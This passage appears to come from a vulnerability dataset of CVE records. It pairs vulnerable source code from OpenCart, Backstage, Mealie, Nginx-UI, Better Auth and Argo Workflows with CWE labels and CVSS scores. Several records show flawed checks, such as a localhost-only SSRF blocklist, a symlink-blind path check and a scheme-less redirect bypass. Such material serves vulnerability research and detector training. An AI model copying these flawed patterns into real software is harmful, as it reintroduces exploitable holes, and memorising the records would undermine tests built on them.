        "public function login(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$json = [];\n\n\t\t// Stop any undefined index messages.\n\t\t$keys = [\n\t\t\t'username',\n\t\t\t'password',\n\t\t\t'redirect'\n\t\t];\n\n\t\tforeach ($keys as $key) {\n\t\t\tif (!isset($this->request->post[$key])) {\n\t\t\t\t$this->request->post[$key] = '';\n\t\t\t}\n\t\t}\n\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t}\n\n\t\tif (!isset($this->request->get['login_token']) || !isset($this->session->data['login_token']) || $this->request->get['login_token'] != $this->session->data['login_token']) {\n\t\t\t$this->session->data['error'] = $this->language->get('error_login');\n\n\t\t\t$json['redirect'] = $this->url->link('common/login', '', true);\n\t\t}\n\n\t\tif (!$json && !$this->user->login($this->request->post['username'], html_entity_decode($this->request->post['password'], ENT_QUOTES, 'UTF-8'))) {\n\t\t\t$json['error'] = $this->language->get('error_login');\n\t\t}\n\n\t\tif (!$json) {\n\t\t\t$this->session->data['user_token'] = oc_token(32);\n\n\t\t\t// Remove login token so it cannot be used again.\n\t\t\tunset($this->session->data['login_token']);\n\n\t\t\t$login_data = [\n\t\t\t\t'ip'         => oc_get_ip(),\n\t\t\t\t'user_agent' => $this->request->server['HTTP_USER_AGENT']\n\t\t\t];\n\n\t\t\t$this->load->model('user/user');\n\n\t\t\t$this->model_user_user->addLogin($this->user->getId(), $login_data);\n\n\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {\n\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];\n\t\t\t} else {\n\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);\n\t\t\t}\n\t\t}\n\n\t\t$this->response->addHeader('Content-Type: application/json');\n\t\t$this->response->setOutput(json_encode($json));\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 54,
          "content": "\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {"
        },
        {
          "line_no": 55,
          "content": "\t\t\t$args = $this->request->get;"
        },
        {
          "line_no": 57,
          "content": "\t\t\t$route = $args['route'];"
        },
        {
          "line_no": 59,
          "content": "\t\t\tunset($args['route']);"
        },
        {
          "line_no": 60,
          "content": "\t\t\tunset($args['user_token']);"
        },
        {
          "line_no": 62,
          "content": "\t\t\t$url = '';"
        },
        {
          "line_no": 64,
          "content": "\t\t\t$url .= http_build_query($args);"
        },
        {
          "line_no": 66,
          "content": "\t\t\t$data['redirect'] = $this->url->link($route, $url);"
        },
        {
          "line_no": 67,
          "content": "\t\t} else {"
        },
        {
          "line_no": 68,
          "content": "\t\t\t$data['redirect'] = '';"
        },
        {
          "line_no": 69,
          "content": "\t\t}"
        },
        {
          "line_no": 129,
          "content": "\t\t\tif ($this->request->post['redirect'] && str_starts_with(html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8'), HTTP_SERVER)) {"
        },
        {
          "line_no": 130,
          "content": "\t\t\t\t$json['redirect'] = html_entity_decode($this->request->post['redirect'], ENT_QUOTES, 'UTF-8') . '&user_token=' . $this->session->data['user_token'];"
        },
        {
          "line_no": 131,
          "content": "\t\t\t} else {"
        },
        {
          "line_no": 132,
          "content": "\t\t\t\t$json['redirect'] = $this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true);"
        },
        {
          "line_no": 133,
          "content": "\t\t\t}"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "LOW",
    "cvss_score": 2.1,
    "cvss_version": 4.0
  },
  {
    "id": 336,
    "cve": "CVE-2024-26150",
    "description": "`@backstage/backend-common` is a common functionality library for backends for Backstage, an open platform for building developer portals. In `@backstage/backend-common` prior to versions 0.21.1, 0.20.2, and 0.19.10, paths checks with the `resolveSafeChildPath` utility were not exhaustive enough, leading to risk of path traversal vulnerabilities if symlinks can be injected by attackers. This issue is patched in `@backstage/backend-common` versions 0.21.1, 0.20.2, and 0.19.10.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/backend-common/src/paths.ts",
          "content": "/*\n * Copyright 2020 The Backstage Authors\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport { isChildPath } from '@backstage/cli-common';\nimport { NotAllowedError } from '@backstage/errors';\nimport { resolve as resolvePath } from 'path';\n\n/** @internal */\nexport const packagePathMocks = new Map<\n  string,\n  (paths: string[]) => string | undefined\n>();\n\n/**\n * Resolve a path relative to the root of a package directory.\n * Additional path arguments are resolved relative to the package dir.\n *\n * This is particularly useful when you want to access assets shipped with\n * your backend plugin package. When doing so, do not forget to include the assets\n * in your published package by adding them to `files` in your `package.json`.\n *\n * @public\n */\nexport function resolvePackagePath(name: string, ...paths: string[]) {\n  const mockedResolve = packagePathMocks.get(name);\n  if (mockedResolve) {\n    const resolved = mockedResolve(paths);\n    if (resolved) {\n      return resolved;\n    }\n  }\n\n  const req =\n    typeof __non_webpack_require__ === 'undefined'\n      ? require\n      : __non_webpack_require__;\n\n  return resolvePath(req.resolve(`${name}/package.json`), '..', ...paths);\n}\n\n/**\n * Resolves a target path from a base path while guaranteeing that the result is\n * a path that point to or within the base path. This is useful for resolving\n * paths from user input, as it otherwise opens up for vulnerabilities.\n *\n * @public\n * @param base - The base directory to resolve the path from.\n * @param path - The target path, relative or absolute\n * @returns A path that is guaranteed to point to or within the base path.\n */\nexport function resolveSafeChildPath(base: string, path: string): string {\n  const targetPath = resolvePath(base, path);\n\n  if (!isChildPath(base, targetPath)) {\n    throw new NotAllowedError(\n      'Relative path is not allowed to refer to a directory outside its parent',\n    );\n  }\n\n  return targetPath;\n}\n\n// Re-export isChildPath so that backend packages don't need to depend on cli-common\nexport { isChildPath };\n"
        }
      ],
      "method_level": [
        "resolveSafeChildPath"
      ],
      "hunk_level": [
        {
          "line_no": 67,
          "content": "  if (!isChildPath(base, targetPath)) {"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 696,
    "cve": "CVE-2024-31993",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the scrape_image function will retrieve an image based on a user-provided URL, however the provided URL is not validated to point to an external location and does not have any enforced rate limiting. The response from the Mealie server will also vary depending on whether or not the target file is an image, is not an image, or does not exist. Additionally, when a file is retrieved the file may remain stored on Mealie’s file system as original.jpg under the UUID of the recipe it was requested for. If the attacker has access to an admin account (e.g. the default changeme@example.com), this file can then be retrieved. Note that if Mealie is running in a development setting this could be leveraged by an attacker to retrieve any file that the Mealie server had downloaded in this fashion without the need for administrator access. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.2,
    "cvss_version": 3.1
  },
  {
    "id": 79,
    "cve": "CVE-2024-22198",
    "description": "Nginx-UI is a web interface to manage Nginx configurations. It is vulnerable to arbitrary command execution by abusing the configuration settings. The `Home > Preference` page exposes a list of system settings such as `Run Mode`, `Jwt Secret`, `Node Secret` and `Terminal Start Command`. While the UI doesn't allow users to modify the `Terminal Start Command` setting, it is possible to do so by sending a request to the API. This issue may lead to authenticated remote code execution, privilege escalation, and information disclosure. This vulnerability has been patched in version 2.0.0.beta.9.",
    "vulnerability": {
      "file_level": [
        {
          "name": "api/system/settings.go",
          "content": "package system\n\nimport (\n    \"github.com/0xJacky/Nginx-UI/api\"\n    \"github.com/0xJacky/Nginx-UI/settings\"\n    \"github.com/gin-gonic/gin\"\n    \"net/http\"\n)\n\nfunc GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}\n\nfunc SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}\n"
        }
      ],
      "method_level": [
        "func GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}",
        "func SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 11,
          "content": "    c.JSON(http.StatusOK, gin.H{"
        },
        {
          "line_no": 12,
          "content": "        \"server\": settings.ServerSettings,"
        },
        {
          "line_no": 13,
          "content": "        \"nginx\":  settings.NginxSettings,"
        },
        {
          "line_no": 14,
          "content": "        \"openai\": settings.OpenAISettings,"
        },
        {
          "line_no": 15,
          "content": "    })"
        },
        {
          "line_no": 19,
          "content": "    var json struct {"
        },
        {
          "line_no": 20,
          "content": "        Server settings.Server `json:\"server\"`"
        },
        {
          "line_no": 21,
          "content": "        Nginx  settings.Nginx  `json:\"nginx\"`"
        },
        {
          "line_no": 22,
          "content": "        Openai settings.OpenAI `json:\"openai\"`"
        },
        {
          "line_no": 23,
          "content": "    }"
        },
        {
          "line_no": 25,
          "content": "    if !api.BindAndValid(c, &json) {"
        },
        {
          "line_no": 26,
          "content": "        return"
        },
        {
          "line_no": 27,
          "content": "    }"
        },
        {
          "line_no": 29,
          "content": "    settings.ServerSettings = json.Server"
        },
        {
          "line_no": 30,
          "content": "    settings.NginxSettings = json.Nginx"
        },
        {
          "line_no": 31,
          "content": "    settings.OpenAISettings = json.Openai"
        },
        {
          "line_no": 33,
          "content": "    settings.ReflectFrom()"
        },
        {
          "line_no": 35,
          "content": "    err := settings.Save()"
        },
        {
          "line_no": 36,
          "content": "    if err != nil {"
        },
        {
          "line_no": 37,
          "content": "        api.ErrHandler(c, err)"
        },
        {
          "line_no": 38,
          "content": "        return"
        },
        {
          "line_no": 39,
          "content": "    }"
        },
        {
          "line_no": 41,
          "content": "    GetSettings(c)"
        }
      ]
    },
    "cwe": [
      "CWE-77"
    ],
    "severity": "HIGH",
    "cvss_score": 7.1,
    "cvss_version": 3.1
  },
  {
    "id": 43,
    "cve": "CVE-2025-27143",
    "description": "Better Auth is an authentication and authorization library for TypeScript. Prior to version 1.1.21, the application is vulnerable to an open redirect due to improper validation of the callbackURL parameter in the email verification endpoint and any other endpoint that accepts callback url. While the server blocks fully qualified URLs, it incorrectly allows scheme-less URLs. This results in the browser interpreting the URL as a fully qualified URL, leading to unintended redirection. An attacker can exploit this flaw by crafting a malicious verification link and tricking users into clicking it. Upon successful email verification, the user will be automatically redirected to the attacker's website, which can be used for phishing, malware distribution, or stealing sensitive authentication tokens. This CVE is a bypass of the fix for GHSA-8jhw-6pjj-8723/CVE-2024-56734. Version 1.1.21 contains an updated patch.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/better-auth/src/api/middlewares/origin-check.ts",
          "content": "import { APIError } from \"better-call\";\nimport { createAuthMiddleware } from \"../call\";\nimport { wildcardMatch } from \"../../utils/wildcard\";\nimport { getHost, getOrigin, getProtocol } from \"../../utils/url\";\nimport type { GenericEndpointContext } from \"../../types\";\n\n/**\n * A middleware to validate callbackURL and origin against\n * trustedOrigins.\n */\nexport const originCheckMiddleware = createAuthMiddleware(async (ctx) => {\n\tif (ctx.request?.method !== \"POST\" || !ctx.request) {\n\t\treturn;\n\t}\n\tconst { body, query, context } = ctx;\n\tconst originHeader =\n\t\tctx.headers?.get(\"origin\") || ctx.headers?.get(\"referer\") || \"\";\n\tconst callbackURL = body?.callbackURL || query?.callbackURL;\n\tconst redirectURL = body?.redirectTo;\n\tconst errorCallbackURL = body?.errorCallbackURL;\n\tconst newUserCallbackURL = body?.newUserCallbackURL;\n\tconst trustedOrigins: string[] = Array.isArray(context.options.trustedOrigins)\n\t\t? context.trustedOrigins\n\t\t: [\n\t\t\t\t...context.trustedOrigins,\n\t\t\t\t...(context.options.trustedOrigins?.(ctx.request) || []),\n\t\t\t];\n\tconst usesCookies = ctx.headers?.has(\"cookie\");\n\n\tconst matchesPattern = (url: string, pattern: string): boolean => {\n\t\tif (url.startsWith(\"/\")) {\n\t\t\treturn false;\n\t\t}\n\t\tif (pattern.includes(\"*\")) {\n\t\t\treturn wildcardMatch(pattern)(getHost(url));\n\t\t}\n\n\t\tconst protocol = getProtocol(url);\n\t\treturn protocol === \"http:\" || protocol === \"https:\" || !protocol\n\t\t\t? pattern === getOrigin(url)\n\t\t\t: url.startsWith(pattern);\n\t};\n\tconst validateURL = (url: string | undefined, label: string) => {\n\t\tif (!url) {\n\t\t\treturn;\n\t\t}\n\t\tconst isTrustedOrigin = trustedOrigins.some(\n\t\t\t(origin) =>\n\t\t\t\tmatchesPattern(url, origin) ||\n\t\t\t\t(url?.startsWith(\"/\") && label !== \"origin\" && !url.includes(\":\")),\n\t\t);\n\t\tif (!isTrustedOrigin) {\n\t\t\tctx.context.logger.error(`Invalid ${label}: ${url}`);\n\t\t\tctx.context.logger.info(\n\t\t\t\t`If it's a valid URL, please add ${url} to trustedOrigins in your auth config\\n`,\n\t\t\t\t`Current list of trustedOrigins: ${trustedOrigins}`,\n\t\t\t);\n\t\t\tthrow new APIError(\"FORBIDDEN\", { message: `Invalid ${label}` });\n\t\t}\n\t};\n\tif (usesCookies && !ctx.context.options.advanced?.disableCSRFCheck) {\n\t\tvalidateURL(originHeader, \"origin\");\n\t}\n\tcallbackURL && validateURL(callbackURL, \"callbackURL\");\n\tredirectURL && validateURL(redirectURL, \"redirectURL\");\n\terrorCallbackURL && validateURL(errorCallbackURL, \"errorCallbackURL\");\n\tnewUserCallbackURL && validateURL(newUserCallbackURL, \"newUserCallbackURL\");\n});\n\nexport const originCheck = (\n\tgetValue: (ctx: GenericEndpointContext) => string,\n) =>\n\tcreateAuthMiddleware(async (ctx) => {\n\t\tif (!ctx.request) {\n\t\t\treturn;\n\t\t}\n\t\tconst { context } = ctx;\n\t\tconst callbackURL = getValue(ctx);\n\t\tconst trustedOrigins: string[] = Array.isArray(\n\t\t\tcontext.options.trustedOrigins,\n\t\t)\n\t\t\t? context.trustedOrigins\n\t\t\t: [\n\t\t\t\t\t...context.trustedOrigins,\n\t\t\t\t\t...(context.options.trustedOrigins?.(ctx.request) || []),\n\t\t\t\t];\n\n\t\tconst matchesPattern = (url: string, pattern: string): boolean => {\n\t\t\tif (url.startsWith(\"/\")) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tif (pattern.includes(\"*\")) {\n\t\t\t\treturn wildcardMatch(pattern)(getHost(url));\n\t\t\t}\n\t\t\treturn url.startsWith(pattern);\n\t\t};\n\n\t\tconst validateURL = (url: string | undefined, label: string) => {\n\t\t\tif (!url) {\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tconst isTrustedOrigin = trustedOrigins.some(\n\t\t\t\t(origin) =>\n\t\t\t\t\tmatchesPattern(url, origin) ||\n\t\t\t\t\t(url?.startsWith(\"/\") &&\n\t\t\t\t\t\tlabel !== \"origin\" &&\n\t\t\t\t\t\t!url.includes(\":\") &&\n\t\t\t\t\t\t!url.includes(\"//\")),\n\t\t\t);\n\t\t\tif (!isTrustedOrigin) {\n\t\t\t\tctx.context.logger.error(`Invalid ${label}: ${url}`);\n\t\t\t\tctx.context.logger.info(\n\t\t\t\t\t`If it's a valid URL, please add ${url} to trustedOrigins in your auth config\\n`,\n\t\t\t\t\t`Current list of trustedOrigins: ${trustedOrigins}`,\n\t\t\t\t);\n\t\t\t\tthrow new APIError(\"FORBIDDEN\", { message: `Invalid ${label}` });\n\t\t\t}\n\t\t};\n\t\tcallbackURL && validateURL(callbackURL, \"callbackURL\");\n\t});\n"
        }
      ],
      "method_level": [
        "validateURL"
      ],
      "hunk_level": [
        {
          "line_no": 50,
          "content": "\t\t\t\t(url?.startsWith(\"/\") && label !== \"origin\" && !url.includes(\":\")),"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.9,
    "cvss_version": 4.0
  },
  {
    "id": 337,
    "cve": "CVE-2024-26150",
    "description": "`@backstage/backend-common` is a common functionality library for backends for Backstage, an open platform for building developer portals. In `@backstage/backend-common` prior to versions 0.21.1, 0.20.2, and 0.19.10, paths checks with the `resolveSafeChildPath` utility were not exhaustive enough, leading to risk of path traversal vulnerabilities if symlinks can be injected by attackers. This issue is patched in `@backstage/backend-common` versions 0.21.1, 0.20.2, and 0.19.10.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/backend-common/src/paths.ts",
          "content": "/*\n * Copyright 2020 The Backstage Authors\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\nimport { isChildPath } from '@backstage/cli-common';\nimport { NotAllowedError } from '@backstage/errors';\nimport { resolve as resolvePath } from 'path';\nimport { realpathSync as realPath } from 'fs';\n\n/** @internal */\nexport const packagePathMocks = new Map<\n  string,\n  (paths: string[]) => string | undefined\n>();\n\n/**\n * Resolve a path relative to the root of a package directory.\n * Additional path arguments are resolved relative to the package dir.\n *\n * This is particularly useful when you want to access assets shipped with\n * your backend plugin package. When doing so, do not forget to include the assets\n * in your published package by adding them to `files` in your `package.json`.\n *\n * @public\n */\nexport function resolvePackagePath(name: string, ...paths: string[]) {\n  const mockedResolve = packagePathMocks.get(name);\n  if (mockedResolve) {\n    const resolved = mockedResolve(paths);\n    if (resolved) {\n      return resolved;\n    }\n  }\n\n  const req =\n    typeof __non_webpack_require__ === 'undefined'\n      ? require\n      : __non_webpack_require__;\n\n  return resolvePath(req.resolve(`${name}/package.json`), '..', ...paths);\n}\n\n/**\n * Resolves a target path from a base path while guaranteeing that the result is\n * a path that point to or within the base path. This is useful for resolving\n * paths from user input, as it otherwise opens up for vulnerabilities.\n *\n * @public\n * @param base - The base directory to resolve the path from.\n * @param path - The target path, relative or absolute\n * @returns A path that is guaranteed to point to or within the base path.\n */\nexport function resolveSafeChildPath(base: string, path: string): string {\n  const targetPath = resolvePath(base, path);\n\n  if (!isChildPath(resolveRealPath(base), resolveRealPath(targetPath))) {\n    throw new NotAllowedError(\n      'Relative path is not allowed to refer to a directory outside its parent',\n    );\n  }\n\n  return targetPath;\n}\n\nfunction resolveRealPath(path: string): string {\n  try {\n    return realPath(path);\n  } catch (ex) {\n    if (ex.code !== 'ENOENT') {\n      throw ex;\n    }\n  }\n\n  return path;\n}\n// Re-export isChildPath so that backend packages don't need to depend on cli-common\nexport { isChildPath };\n"
        }
      ],
      "method_level": [
        "resolveSafeChildPath"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "  const targetPath = resolvePath(base, path);"
        },
        {
          "line_no": 68,
          "content": "  if (!isChildPath(resolveRealPath(base), resolveRealPath(targetPath))) {"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.7,
    "cvss_version": 3.1
  },
  {
    "id": 1265,
    "cve": "CVE-2024-47827",
    "description": "Argo Workflows is an open source container-native workflow engine for orchestrating parallel jobs on Kubernetes. Due to a race condition in a global variable in 3.6.0-rc1, the argo workflows controller can be made to crash on-command by any user with access to execute a workflow. This vulnerability is fixed in 3.6.0-rc2.",
    "vulnerability": {
      "file_level": [
        {
          "name": "workflow/metrics/metrics_k8s_request.go",
          "content": "package metrics\n\nimport (\n\t\"context\"\n\t\"net/http\"\n\t\"time\"\n\n\t\"k8s.io/client-go/rest\"\n\n\t\"github.com/argoproj/argo-workflows/v3/util/k8s\"\n\t\"github.com/argoproj/argo-workflows/v3/util/telemetry\"\n)\n\nconst (\n\tnameK8sRequestTotal    = `k8s_request_total`\n\tnameK8sRequestDuration = `k8s_request_duration`\n)\n\nfunc addK8sRequests(_ context.Context, m *Metrics) error {\n\terr := m.CreateInstrument(telemetry.Int64Counter,\n\t\tnameK8sRequestTotal,\n\t\t\"Number of kubernetes requests executed.\",\n\t\t\"{request}\",\n\t\ttelemetry.WithAsBuiltIn(),\n\t)\n\tif err != nil {\n\t\treturn err\n\t}\n\terr = m.CreateInstrument(telemetry.Float64Histogram,\n\t\tnameK8sRequestDuration,\n\t\t\"Duration of kubernetes requests executed.\",\n\t\t\"s\",\n\t\ttelemetry.WithDefaultBuckets([]float64{0.1, 0.2, 0.5, 1.0, 2.0, 5.0, 10.0, 20.0, 60.0, 180.0}),\n\t\ttelemetry.WithAsBuiltIn(),\n\t)\n\t// Register this metrics with the global\n\tk8sMetrics.metrics = m\n\treturn err\n}\n\ntype metricsRoundTripper struct {\n\tctx          context.Context\n\troundTripper http.RoundTripper\n\tmetrics      *Metrics\n}\n\n// This is a messy global as we need to register as a roundtripper before\n// we can instantiate metrics\nvar k8sMetrics metricsRoundTripper\n\nfunc (m metricsRoundTripper) RoundTrip(r *http.Request) (*http.Response, error) {\n\tstartTime := time.Now()\n\tx, err := m.roundTripper.RoundTrip(r)\n\tduration := time.Since(startTime)\n\tif x != nil && m.metrics != nil {\n\t\tverb, kind := k8s.ParseRequest(r)\n\t\tattribs := telemetry.InstAttribs{\n\t\t\t{Name: telemetry.AttribRequestKind, Value: kind},\n\t\t\t{Name: telemetry.AttribRequestVerb, Value: verb},\n\t\t\t{Name: telemetry.AttribRequestCode, Value: x.StatusCode},\n\t\t}\n\t\t(*m.metrics).AddInt(m.ctx, nameK8sRequestTotal, 1, attribs)\n\t\t(*m.metrics).Record(m.ctx, nameK8sRequestDuration, duration.Seconds(), attribs)\n\t}\n\treturn x, err\n}\n\nfunc AddMetricsTransportWrapper(ctx context.Context, config *rest.Config) *rest.Config {\n\twrap := config.WrapTransport\n\tconfig.WrapTransport = func(rt http.RoundTripper) http.RoundTripper {\n\t\tif wrap != nil {\n\t\t\trt = 